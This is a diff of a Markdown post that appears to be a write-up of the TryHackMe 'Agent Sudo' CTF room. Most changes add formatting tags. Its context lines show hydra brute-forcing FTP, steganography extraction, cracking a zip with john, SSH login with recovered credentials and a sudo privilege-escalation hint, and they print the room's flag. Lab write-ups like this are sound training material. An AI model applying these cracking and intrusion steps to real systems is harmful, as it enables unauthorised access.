@@ -47,6 +47,7 @@ Now I try to get the Q2 answer, using **gobuster**:
 ```bash
 gobuster dir --url http://10.10.26.150 -w //usr/share/wordlists/dirb/common.txt | tee gobuster.txt
 ```
+{: .nolineno }
 
 No secret page revealed...  
 Hint: Answer format: xxxx-xxxxx  
@@ -113,6 +114,8 @@ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.149.150 -t 4
 [21][ftp] host: 10.10.149.150 login: chris password: crystal
 1 of 1 target successfully completed, 1 valid password found
 ```
+{: .nolineno }
+
 Q1 done
 
 Now lets connect to the ftp server with chris:crystal
@@ -135,6 +138,7 @@ ftp> ls
 226 Directory send OK.
 ftp>
 ```
+{: .nolineno }
 
 We can´t see any zip file refered in Q2
 After dowloading the 3 files and opened the To_agentJ.txt we got...
@@ -180,6 +184,7 @@ Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)
 Image Size : 440x501
 Megapixels : 0.220
 ```
+{: .nolineno }
 
 ```bash
 └─$ exiftool cutie.png
@@ -207,6 +212,8 @@ Warning : [minor] Trailer data after PNG IEND chunk
 Image Size : 528x528
 Megapixels : 0.279
 ```
+{: .nolineno }
+
 Aparently, no useful info!
 
 Tried the -b option to extract binaries and the interesting info is: "Trailer data after PNG IEND chunk528 5280.278784".  
@@ -216,6 +223,7 @@ after installing **xxd**, tried:
 ```bash
 xxd cutie.png
 ```
+{: .nolineno }
 
 At the end of the file, found...  
 
@@ -240,6 +248,7 @@ At the end of the file, found...
 00008800: 4501 0800 504b 0506 0000 0000 0100 0100 E...PK..........
 00008810: 6a00 0000 9800 0000 0000 j.........
 ```
+{: .nolineno }
 
 To_agentR.txt
 
@@ -254,6 +263,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820 0x8804 End of Zip archive, footer length: 22
 ```
+{: .nolineno }
 
 Now with **-e** option...
 
@@ -282,6 +292,8 @@ drwxr-xr-x 2 kali kali 4096 Jan 10 13:36 nmap
 └─$ ls
 365 365.zlib 8702.zip To_agentR.txt
 ```
+{: .nolineno }
+
 ok we have now 3 files extracted! But the text file is empty and zip file is encrypted, At this point we may try to get the password by using **zip2john** and then use **john** to crack the hash...
 
 ```bash
@@ -310,6 +322,7 @@ alien (8702.zip/To_agentR.txt)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+{: .nolineno }
 
 We have now the zip password: "alien". Now we can unzip it with **7z**..
 
@@ -347,8 +360,10 @@ total 324
 -rw-r--r-- 1 kali kali 86 Oct 29 2019 To_agentR.txt
 -rw-r--r-- 1 kali kali 279 Jan 10 14:27 zip.hash
 ```
+{: .nolineno }
 
 Look into the To_agentR.txt:
+
 ```bash
 └─$ cat To_agentR.txt
 Agent C,
@@ -359,6 +374,7 @@ By,
 
 Agent R
 ```
+{: .nolineno }
 
 We can now answer Q2 (alien)
 
@@ -384,7 +400,10 @@ size: 181.0 Byte
 encrypted: rijndael-128, cbc
 compressed: yes
 ```
+{: .nolineno }
+
 One embedded file confirmed, message.txt. Now lets extract the file and read it...
+
 ```bash
 └─$ steghide extract -sf cute-alien.jpg
 Enter passphrase:
@@ -401,6 +420,8 @@ Your buddy,
 
 chris
 ```
+{: .nolineno }
+
 we got a user 'james' and a password 'hackerrules!'
 
 Lets confirm the password on SSH, as the Q5 is asking for a SSH password
@@ -426,6 +447,8 @@ james@agent-sudo:~$ ls
 Alien_autospy.jpg user_flag.txt
 james@agent-sudo:~$
 ```
+{: .nolineno }
+
 Q5 done
 
 ls give us 2 files, maybe useful on next task.
@@ -441,7 +464,6 @@ Q1 What is the user flag?
 
 Q2 What is the incident of the photo called?
 
-
 > "roswell alien autopsy"
 
 
@@ -454,15 +476,19 @@ Alien_autospy.jpg user_flag.txt
 james@agent-sudo:~$ cat user_flag.txt
 b03d975e8c92a7c04146cfa7a5a313c7
 ```
+{: .nolineno }
 
 Q1 done
 
 Hint for Q2: 'Reverse image and Foxnews'
 
 Lets download the image file:
+
 ```bash
 scp james@10.10.76.44:Alien_autospy.jpg ~/Desktop/hellbender/thm/rooms/Agent\ Sudo
 ```
+{: .nolineno }
+
 Q2 Done
 
 ## Task 5 Privilege escalation
@@ -503,6 +529,7 @@ james@agent-sudo:~$ sudo su
 Sorry, user james is not allowed to execute '/bin/su' as root on agent-sudo.
 james@agent-sudo:~$
 ```
+{: .nolineno }
 
 It looks like our user is not allowed to run /bin/bash as root since we have a !root. However, this looks weird as the first all means our user can run /bin/bash as any user. This is interesting, perhaps we can find a way to exploit this.
 As luck would have it, a google search returns us something we might be able to use to gain root privileges.
@@ -528,6 +555,7 @@ By,
 
 DesKel a.k.a Agent R
 ```
+{: .nolineno }
 
 Finally we have Q2 and Q3 also.
 
